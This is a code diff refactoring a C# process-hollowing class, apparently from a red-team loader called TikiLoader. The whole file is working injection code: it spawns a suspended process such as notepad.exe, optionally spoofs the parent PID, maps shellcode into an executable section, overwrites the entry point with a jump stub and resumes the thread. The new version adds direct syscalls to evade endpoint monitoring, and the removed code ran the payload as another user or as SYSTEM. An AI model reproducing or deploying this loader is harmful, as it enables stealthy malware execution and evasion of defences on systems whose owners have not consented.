@@ -1,313 +1,285 @@
 ﻿using System;
-using System.Collections.Generic;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
-
-using static TikiLoader.Imports;
-using static TikiLoader.Structs;
-using static TikiLoader.Enums;
-using static TikiLoader.Generic;
 
 namespace TikiLoader
 {
     public class Hollower
     {
-        private const int AttributeSize = 24;
-        private const ulong PatchSize = 0x10;
+        public string BinaryPath { get; set; } = "C:\\Windows\\System32\\notepad.exe";
+        public string WorkingDirectory { get; set; } = "C:\\Windows\\System32";
+        public int ParentId { get; set; } = 0;
+        public bool BlockDlls { get; set; } = false;
 
-        IntPtr section_;
-        IntPtr localmap_;
-        IntPtr remotemap_;
-        IntPtr localsize_;
-        IntPtr remotesize_;
-        IntPtr pModBase_;
-        IntPtr pEntry_;
-        uint rvaEntryOffset_;
-        uint size_;
-        byte[] inner_;
+        private bool _syscalls;
 
-        private uint round_to_page(uint size)
+        private IntPtr _section;
+        private IntPtr _localMap;
+        private IntPtr _remoteMap;
+        private IntPtr _pModBase;
+        private IntPtr _pEntry;
+        private ulong _size;
+
+        private readonly IntPtr _inner;
+
+        public Hollower()
         {
-            SYSTEM_INFO info = new SYSTEM_INFO();
-            GetSystemInfo(ref info);
-            return (info.dwPageSize - size % info.dwPageSize) + size;
+            _inner = Marshal.AllocHGlobal(512);
         }
-
-        private bool nt_success(long v)
+        
+        public void Hollow(byte[] shellcode, bool useSyscalls = false)
         {
-            return (v >= 0);
+            _syscalls = useSyscalls;
+            
+            var pi = Utilities.SpawnProcess(
+                BinaryPath,
+                WorkingDirectory,
+                BlockDlls,
+                ParentId,
+                true);
+            
+            FindEntry(pi.hProcess);
+            GetEntry();
+            CreateSection((uint)shellcode.Length);
+            SetLocalSection();
+            CopyShellcode(shellcode);
+            MapAndStart(pi);
+            CloseHandles(pi);
         }
-
-        private IntPtr GetCurrent()
+        
+        private void FindEntry(IntPtr hProcess)
         {
-            return GetCurrentProcess();
+            var pbi = Native.NtQueryInformationProcessBasicInformation(hProcess);
+
+            IntPtr pointer;
+            
+            if (Utilities.Is64Bit)
+                pointer = (IntPtr)((long)pbi.PebBaseAddress + 16);
+            else
+                pointer = (IntPtr)((int)pbi.PebBaseAddress + 8);
+
+            var buf = Marshal.AllocHGlobal(IntPtr.Size);
+            var toRead = (uint)IntPtr.Size;
+            
+            Native.NtReadVirtualMemory(
+                hProcess,
+                pointer,
+                buf,
+                ref toRead);
+
+            _pModBase = Marshal.ReadIntPtr(buf);
+            Marshal.FreeHGlobal(buf);
+            
+            toRead = 512;
+            Native.NtReadVirtualMemory(
+                hProcess,
+                _pModBase,
+                _inner,
+                ref toRead);
         }
-
-        private KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, MemoryProtection protect, IntPtr addr)
+        
+        private void GetEntry()
         {
-            IntPtr baseAddr = addr;
-            IntPtr viewSize = (IntPtr)size_;
+            var buf = new byte[512];
+            Marshal.Copy(_inner, buf, 0, 512);
 
-            var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
-            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
-        }
-
-        private bool CreateSection(uint size)
-        {
-            LARGE_INTEGER liVal = new LARGE_INTEGER();
-            size_ = round_to_page(size);
-            liVal.LowPart = size_;
-
-            var status = ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, MemoryProtection.ExecuteReadWrite, AllocationType.SecCommit, (IntPtr)0);
-
-            return nt_success(status);
-        }
-
-        private void SetLocalSection(uint size)
-        {
-            var vals = MapSection(GetCurrent(), MemoryProtection.ReadWrite, IntPtr.Zero);
-
-            localmap_ = vals.Key;
-            localsize_ = vals.Value;
-        }
-
-        private void CopyShellcode(byte[] buf)
-        {
-            var lsize = size_;
+            IntPtr res;
 
             unsafe
             {
-                byte* p = (byte*)localmap_;
-
-                for (int i = 0; i < buf.Length; i++)
+                fixed (byte* p = buf)
                 {
-                    p[i] = buf[i];
+                    var e_lfanew_offset = *(uint*)(p + 0x3C);
+                    var nthdr = p + e_lfanew_offset;
+                    var opthdr = nthdr + 0x18;
+                    var entry_ptr = opthdr + 0x10;
+                    var tmp = *(int*)entry_ptr;
+
+                    if (Utilities.Is64Bit)
+                        res = (IntPtr)(_pModBase.ToInt64() + tmp);
+                    else
+                        res = (IntPtr)(_pModBase.ToInt32() + tmp);
                 }
             }
+
+            _pEntry = res;
+        }
+        
+        private void CreateSection(uint size)
+        {
+            _size = size;
+
+            if (_syscalls)
+            {
+                Syscall.NtCreateSection(
+                    ref _section,
+                    (uint)Data.Win32.Kernel32.StandardRights.GenericAll,
+                    IntPtr.Zero,
+                    ref _size,
+                    Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
+                    Data.Win32.WinNT.SEC_COMMIT,
+                    IntPtr.Zero);
+            }
+            else
+            {
+                Native.NtCreateSection(
+                    ref _section,
+                    (uint)Data.Win32.Kernel32.StandardRights.GenericAll,
+                    IntPtr.Zero,
+                    ref _size,
+                    Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
+                    Data.Win32.WinNT.SEC_COMMIT,
+                    IntPtr.Zero);
+            }
+        }
+        
+        private void SetLocalSection()
+        {
+            using var self = Process.GetCurrentProcess();
+            
+            _localMap = MapSection(
+                self.Handle,
+                Data.Win32.WinNT.PAGE_READWRITE,
+                IntPtr.Zero);
+        }
+        
+        private IntPtr MapSection(IntPtr procHandle, uint protect, IntPtr baseAddress)
+        {
+            var address = baseAddress;
+
+            if (_syscalls)
+            {
+                Syscall.NtMapViewOfSection(
+                    _section,
+                    procHandle,
+                    ref address,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    ref _size,
+                    1,
+                    0,
+                    protect);
+            }
+            else
+            {
+                Native.NtMapViewOfSection(
+                    _section,
+                    procHandle,
+                    ref address,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    ref _size,
+                    1,
+                    0,
+                    protect);
+            }
+
+            return address;
+        }
+        
+        private void CopyShellcode(byte[] shellcode)
+        {
+            Marshal.Copy(shellcode, 0, _localMap, shellcode.Length);
         }
 
-        private KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
+        private (IntPtr Ptr, int Size) BuildEntryPatch()
         {
-            int i = 0;
-            IntPtr ptr;
+            var i = 0;
 
-            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);
+            var dest = _remoteMap;
+            var ptr = Marshal.AllocHGlobal((IntPtr)0x10);
 
             unsafe
             {
-
                 var p = (byte*)ptr;
-                byte[] tmp = null;
+                byte[] tmp;
 
-                if (IntPtr.Size == 4)
+                if (Utilities.Is64Bit)
                 {
-                    p[i] = 0xb8;
+                    p[i] = 0x48; // rex
                     i++;
-                    var val = (Int32)dest;
+                    p[i] = 0xb8; // mov rax, <imm8>
+                    i++;
+
+                    var val = (long)dest;
                     tmp = BitConverter.GetBytes(val);
                 }
                 else
                 {
-                    p[i] = 0x48;
+                    p[i] = 0xb8; // mov eax, <imm4>
                     i++;
-                    p[i] = 0xb8;
-                    i++;
-
-                    var val = (Int64)dest;
+                    var val = (int)dest;
                     tmp = BitConverter.GetBytes(val);
                 }
 
-                for (int j = 0; j < IntPtr.Size; j++)
+                for (var j = 0; j < IntPtr.Size; j++)
                     p[i + j] = tmp[j];
 
                 i += IntPtr.Size;
                 p[i] = 0xff;
                 i++;
-                p[i] = 0xe0;
+                p[i] = 0xe0; // jmp [r|e]ax
                 i++;
             }
 
-            return new KeyValuePair<int, IntPtr>(i, ptr);
+            return (ptr, i);
         }
 
-        private IntPtr GetEntryFromBuffer(byte[] buf)
+        private void MapAndStart(Data.Win32.Kernel32.PROCESS_INFORMATION pi)
         {
-            IntPtr res = IntPtr.Zero;
-            unsafe
-            {
-                fixed (byte* p = buf)
-                {
-                    uint e_lfanew_offset = *((uint*)(p + 0x3c));
+            _remoteMap = MapSection(
+                pi.hProcess,
+                Data.Win32.WinNT.PAGE_EXECUTE_READ,
+                IntPtr.Zero);
 
-                    byte* nthdr = (p + e_lfanew_offset);
+            var patch = BuildEntryPatch();
+            var pSize = (IntPtr) patch.Size;
 
-                    byte* opthdr = (nthdr + 0x18);
+            var oldProtect = Native.NtProtectVirtualMemory(
+                pi.hProcess,
+                ref _pEntry,
+                ref pSize,
+                Data.Win32.WinNT.PAGE_READWRITE);
 
-                    ushort t = *((ushort*)opthdr);
+            _ = Native.NtWriteVirtualMemory(
+                pi.hProcess,
+                _pEntry,
+                patch.Ptr,
+                (uint) patch.Size);
 
-                    byte* entry_ptr = (opthdr + 0x10);
+            _ = Native.NtProtectVirtualMemory(
+                pi.hProcess,
+                ref _pEntry,
+                ref pSize,
+                oldProtect);
 
-                    var tmp = *((int*)entry_ptr);
+            Marshal.FreeHGlobal(patch.Ptr);
 
-                    rvaEntryOffset_ = (uint)tmp;
-
-                    if (IntPtr.Size == 4)
-                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
-                    else
-                        res = (IntPtr)(pModBase_.ToInt64() + tmp);
-
-                }
-            }
-
-            pEntry_ = res;
-            return res;
-        }
-
-        private IntPtr FindEntry(IntPtr hProc)
-        {
-            var basicInfo = new PROCESS_BASIC_INFORMATION();
-            uint tmp = 0;
-
-            var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
-
-            IntPtr readLoc = IntPtr.Zero;
-            var addrBuf = new byte[IntPtr.Size];
-            if (IntPtr.Size == 4)
-            {
-                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
-            }
+            if (_syscalls)
+                Syscall.NtResumeThread(pi.hThread, IntPtr.Zero);
             else
-            {
-                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
-            }
-
-            IntPtr nRead = IntPtr.Zero;
-
-            ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead);
-
-            if (IntPtr.Size == 4)
-                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
-            else
-                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
-
-            pModBase_ = readLoc;
-            ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
-
-            return GetEntryFromBuffer(inner_);
+                Native.NtResumeThread(pi.hThread, IntPtr.Zero);
         }
 
-        public void MapAndStart(PROCESS_INFORMATION pInfo)
+        private static void CloseHandles(Data.Win32.Kernel32.PROCESS_INFORMATION pi)
         {
-            var tmp = MapSection(pInfo.hProcess, MemoryProtection.ExecuteRead, IntPtr.Zero);
-
-            remotemap_ = tmp.Key;
-            remotesize_ = tmp.Value;
-
-            var patch = BuildEntryPatch(tmp.Key);
-
-            try
-            {
-                var pSize = (IntPtr)patch.Key;
-                IntPtr tPtr = new IntPtr();
-
-                WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr);
-            }
-            finally
-            {
-                if (patch.Value != IntPtr.Zero)
-                    Marshal.FreeHGlobal(patch.Value);
-            }
-
-            var tbuf = new byte[0x1000];
-            var nRead = new IntPtr();
-
-            ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
-            var res = ResumeThread(pInfo.hThread);
-        }
-
-        private IntPtr GetBuffer()
-        {
-            return localmap_;
+            Win32.CloseHandle(pi.hThread);
+            Win32.CloseHandle(pi.hProcess);
         }
 
         ~Hollower()
         {
-            if (localmap_ != (IntPtr)0)
-                ZwUnmapViewOfSection(section_, localmap_);
-        }
+            if (_localMap != IntPtr.Zero)
+            {
+                if (_syscalls)
+                    Syscall.NtUnmapViewOfSection(_section, _localMap);
+                else
+                    Native.NtUnmapViewOfSection(_section, _localMap);
+            }
 
-        public void Hollow(string binary, byte[] shellcode, int ppid)
-        {
-            var pinf = StartProcess(binary, ppid);
-
-            FindEntry(pinf.hProcess);
-            CreateSection((uint)shellcode.Length);
-            SetLocalSection((uint)shellcode.Length);
-            CopyShellcode(shellcode);
-            MapAndStart(pinf);
-            CloseHandle(pinf.hThread);
-            CloseHandle(pinf.hProcess);
-        }
-
-        public void HollowWithoutPid(string binary, byte[] shellcode)
-        {
-            var pinf = StartProcessWOPid(binary);
-
-            FindEntry(pinf.hProcess);
-            CreateSection((uint)shellcode.Length);
-            SetLocalSection((uint)shellcode.Length);
-            CopyShellcode(shellcode);
-            MapAndStart(pinf);
-            CloseHandle(pinf.hThread);
-            CloseHandle(pinf.hProcess);
-        }
-
-        public void HollowAs(string binary, byte[] shellcode, string domain, string username, string password)
-        {
-            var pinf = StartProcessAs(binary, domain, username, password);
-
-            FindEntry(pinf.hProcess);
-            CreateSection((uint)shellcode.Length);
-            SetLocalSection((uint)shellcode.Length);
-            CopyShellcode(shellcode);
-            MapAndStart(pinf);
-            CloseHandle(pinf.hThread);
-            CloseHandle(pinf.hProcess);
-        }
-
-        public void HollowAsSystem(string binary, byte[] shellcode, int impersonationPid)
-        {
-            var pinf = StartProcessAsSystem(binary, impersonationPid);
-
-            FindEntry(pinf.hProcess);
-            CreateSection((uint)shellcode.Length);
-            SetLocalSection((uint)shellcode.Length);
-            CopyShellcode(shellcode);
-            MapAndStart(pinf);
-            CloseHandle(pinf.hThread);
-            CloseHandle(pinf.hProcess);
-        }
-
-        public void HollowElevated(string binary, byte[] shellcode, int elevatedPid)
-        {
-            var pinf = StartElevatedProcess(binary, elevatedPid);
-
-            FindEntry(pinf.hProcess);
-            CreateSection((uint)shellcode.Length);
-            SetLocalSection((uint)shellcode.Length);
-            CopyShellcode(shellcode);
-            MapAndStart(pinf);
-            CloseHandle(pinf.hThread);
-            CloseHandle(pinf.hProcess);
-        }
-
-        public Hollower()
-        {
-            section_ = new IntPtr();
-            localmap_ = new IntPtr();
-            remotemap_ = new IntPtr();
-            localsize_ = new IntPtr();
-            remotesize_ = new IntPtr();
-            inner_ = new byte[0x1000];
+            Marshal.FreeHGlobal(_inner);
         }
     }
 }
